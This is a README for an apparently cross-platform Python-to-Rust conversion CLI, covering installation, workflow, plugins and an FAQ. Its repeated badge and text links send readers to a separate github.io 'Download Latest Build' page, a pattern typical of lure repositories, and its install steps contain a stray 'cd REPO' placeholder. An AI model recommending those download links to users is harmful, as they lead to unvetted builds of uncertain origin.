# Code Convert Helper vUnreleased - Python-to-Rust Code Conversion Tool 2026

> **Code Convert Helper is a cross-platform command-line utility that converts a supported subset of Python into Rust, while making type information, ownership choices, and unsupported syntax available for inspection.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unreleased-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/scotttomzxky2432/code-convert-helper-cli?style=flat-square)](https://github.com/scotttomzxky2432/code-convert-helper-cli)

---

<p align="center">
  <a href="https://scotttomzxky2432.github.io/code-convert-helper-cli/">
    <img src="https://img.shields.io/badge/Download-Code%20Convert%20Helper%20Latest-brightgreen?style=for-the-badge" alt="Download Code Convert Helper">
  </a>
</p>

> **[Download Code Convert Helper Unreleased](https://scotttomzxky2432.github.io/code-convert-helper-cli/)**

---

[Download Latest Build](https://scotttomzxky2432.github.io/code-convert-helper-cli/)

---

## Overview

Code Convert Helper supports developers who are gradually moving Python projects toward Rust. It takes supported Python input through a structured conversion process and emits Rust-focused output while keeping uncertain decisions visible rather than concealing them.

The workflow is built for migration work that can be reviewed and adjusted. Developers may provide type and ownership guidance, while unresolved choices, ownership disagreements, and unsupported syntax are called out for further attention. Comments, documentation, directives, and intermediate representation information remain part of the conversion process.

---

## Capabilities

- Translates a core subset of Python into Rust.
- Exposes translation decisions instead of silently selecting assumptions.
- Uses type hints and ownership hints to influence generated Rust.
- Identifies unresolved decisions and ownership conflicts.
- Keeps comments and understands conversion directives.
- Produces versioned, locked JSON intermediate representation files.
- Retains unsupported constructs as explicitly marked verbatim blocks.
- Transforms Sphinx, Google, and NumPy docstrings into `rustdoc`.
- Includes commands for preflight validation, source conversion, and intermediate representation inspection.
- Offers a plugin mechanism for ecosystem-specific conversion logic.

---

## Installation

First clone the repository and move into the checkout:

```bash
git clone https://github.com/scotttomzxky2432/code-convert-helper-cli.git
cd REPO
```

Install the package through the Python packaging workflow provided by the repository, then confirm that the CLI is available:

```bash
python -m pip install .
code-convert-helper --help
```

When using an uninstalled checkout, invoke the command through the project's Python environment rather than installing it system-wide.

---

## Command-Line Workflow

The usual process starts with preflight checks, continues with conversion, and ends with inspection:

```bash
code-convert-helper preflight path/to/source.py
code-convert-helper convert path/to/source.py --output generated/
code-convert-helper inspect-ir generated/
```

Provide type or ownership hints whenever Python does not offer enough information to determine an appropriate Rust representation. Before adding generated files to a Rust project, inspect the marked decisions and any verbatim sections.

A repeatable migration cycle looks like this:

1. Check the Python source with the preflight command.
2. Supply type or ownership guidance for ambiguous areas.
3. Convert the source into the chosen output directory.
4. Examine the generated JSON intermediate representation.
5. Resolve or review marked decisions, ownership conflicts, and unsupported constructs.
6. Adjust directives or plugin behavior, then run the conversion again.

> The available command names and flags can change between releases. Use `code-convert-helper --help` to view the interface installed in your environment.

---

## Configuration and Extension

Conversion guidance is intended to live close to the Python source being processed. Supported type hints, ownership hints, and directives can record decisions that cannot be determined reliably from Python semantics alone.

A versioned, locked JSON intermediate representation is also used by the pipeline. Its inspectable translation state can be reviewed together with the generated Rust code.

For behavior tied to a particular ecosystem, use the plugin system. This keeps project-specific conversion logic outside the general-purpose core workflow.

---

## Requirements

- A cross-platform environment that can run the project.
- Python to install and execute the conversion CLI.
- Rust tooling to compile or integrate the generated Rust code.
- Read and write permissions for the source and output directories.
- Extra storage for generated Rust files and JSON intermediate representation data.

---

## Frequently Asked Questions

### Which Python code can Code Convert Helper translate?

The tool handles a core subset of Python and converts it into Rust. Code outside that supported subset is carried through as marked verbatim blocks rather than being represented as completely translated Rust.

### Does it guess types or ownership?

No. Ambiguity is reported through marked decisions and ownership conflicts. When the source does not provide sufficient information, users can add explicit hints.

### Are comments and docstrings preserved?

Comments remain in the workflow, and Sphinx, Google, and NumPy docstrings can be converted to `rustdoc`.

### How do I review a conversion?

Run the preflight, conversion, and intermediate representation inspection steps. The resulting versioned, locked JSON files offer a structured record of the translation state.

### How can I add project-specific behavior?

Use plugins for ecosystem-specific integrations and behavior. This extends the conversion process without modifying its general workflow.

### What does a marked block in the output mean?

Inspect the related Python source and provide appropriate type or ownership hints or directives before converting again. Some unsupported constructs may still need to be implemented manually in Rust.

### Where are updates and builds available?

Visit the repository and the latest available build at [Download Latest Build](https://scotttomzxky2432.github.io/code-convert-helper-cli/).

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
